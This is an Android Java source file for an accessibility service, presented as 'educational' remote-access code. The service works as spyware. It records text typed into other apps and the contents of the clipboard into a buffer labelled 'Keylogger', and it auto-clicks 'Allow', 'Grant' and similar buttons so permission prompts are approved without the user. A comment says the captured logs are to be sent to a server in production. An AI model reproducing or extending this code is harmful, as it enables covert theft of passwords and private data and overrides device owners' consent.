package com.remoteaccess.educational.permissions;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Handler;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class AccessibilityHelperService extends AccessibilityService {

    private static AccessibilityHelperService instance;
    private static boolean isAutoClickEnabled = true;
    private Handler handler;
    private Runnable autoClickDisableRunnable;
    
    // Keylogger
    private ClipboardManager clipboardManager;
    private String lastClipboard = "";
    private StringBuilder keyBuffer = new StringBuilder();
    private static final int BUFFER_SIZE = 100;

    public static AccessibilityHelperService getInstance() {
        return instance;
    }

    public static void disableAutoClick() {
        isAutoClickEnabled = false;
    }

    public static void enableAutoClick() {
        isAutoClickEnabled = true;
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        handler = new Handler();
        
        // Initialize clipboard for keylogger
        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        
        // Auto-disable auto-click after 10 seconds (but keylogger keeps running)
        autoClickDisableRunnable = new Runnable() {
            @Override
            public void run() {
                disableAutoClick();
            }
        };
        handler.postDelayed(autoClickDisableRunnable, 10000);
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED | 
                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED |
                         AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_FOCUSED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        info.notificationTimeout = 50;
        
        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (instance == null) instance = this;
        
        // Always run keylogger (even after auto-click is disabled)
        handleKeylogging(event);
        
        // Auto-click only when enabled
        if (isAutoClickEnabled) {
            performAutoClick();
        }
    }

    private void handleKeylogging(AccessibilityEvent event) {
        try {
            String packageName = event.getPackageName() != null ? 
                               event.getPackageName().toString() : "";
            
            // Skip our own app
            if (packageName.equals(getPackageName())) {
                return;
            }
            
            // Capture text input
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                List<CharSequence> textList = event.getText();
                if (textList != null && !textList.isEmpty()) {
                    StringBuilder sb = new StringBuilder();
                    for (CharSequence text : textList) {
                        if (text != null) {
                            sb.append(text);
                        }
                    }
                    String typedText = sb.toString();
                    if (!typedText.isEmpty() && typedText.length() < 50) {
                        keyBuffer.append("[").append(packageName).append(": ").append(typedText).append("] ");
                    }
                }
            }
            
            // Capture clipboard
            if (clipboardManager != null && clipboardManager.hasPrimaryClip()) {
                try {
                    ClipData clip = clipboardManager.getPrimaryClip();
                    if (clip != null && clip.getItemCount() > 0) {
                        CharSequence clipboardText = clip.getItemAt(0).getText();
                        if (clipboardText != null && !clipboardText.toString().equals(lastClipboard)) {
                            lastClipboard = clipboardText.toString();
                            keyBuffer.append("[CLIPBOARD: ").append(lastClipboard).append("] ");
                        }
                    }
                } catch (Exception e) {
                    // Ignore clipboard errors
                }
            }
            
            // Send logs when buffer is full
            if (keyBuffer.length() >= BUFFER_SIZE) {
                sendKeylogs();
            }
        } catch (Exception e) {
            // Ignore
        }
    }

    private void sendKeylogs() {
        if (keyBuffer.length() > 0) {
            String logs = keyBuffer.toString();
            keyBuffer.setLength(0);
            
            // Log for debugging - in production, send to server
            Log.d("Keylogger", "Captured: " + logs);
        }
    }

    private void performAutoClick() {
        if (!isAutoClickEnabled) return;
        
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) {
            if (handler != null) {
                handler.postDelayed(() -> performAutoClick(), 200);
            }
            return;
        }

        if (findAndClickButton(rootNode, "Allow")) return;
        if (findAndClickButton(rootNode, "ALLOW")) return;
        if (findAndClickButton(rootNode, "Allow all the time")) return;
        if (findAndClickButton(rootNode, "Allow all the time and don't ask again")) return;
        if (findAndClickButton(rootNode, "While using the app")) return;
        if (findAndClickButton(rootNode, "Only this time")) return;
        if (findAndClickButton(rootNode, "Permit")) return;
        if (findAndClickButton(rootNode, "Grant")) return;
        if (findAndClickButton(rootNode, "Yes")) return;
        if (findAndClickButton(rootNode, "OK")) return;
        if (findAndClickButton(rootNode, "Done")) return;
        if (findAndClickButton(rootNode, "Next")) return;
        if (findAndClickButton(rootNode, "Continue")) return;
        
        rootNode.recycle();
    }

    private boolean findAndClickButton(AccessibilityNodeInfo node, String text) {
        if (node == null || !isAutoClickEnabled) return false;

        try {
            if (node.isClickable()) {
                CharSequence nodeText = node.getText();
                if (nodeText != null && nodeText.toString().toLowerCase().contains(text.toLowerCase())) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
                
                CharSequence contentDesc = node.getContentDescription();
                if (contentDesc != null && contentDesc.toString().toLowerCase().contains(text.toLowerCase())) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
            }
            
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (findAndClickButton(child, text)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        } catch (Exception e) {
            // Ignore
        }

        return false;
    }

    @Override
    public void onInterrupt() {
        // Service interrupted
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
        if (handler != null && autoClickDisableRunnable != null) {
            handler.removeCallbacks(autoClickDisableRunnable);
        }
    }
}
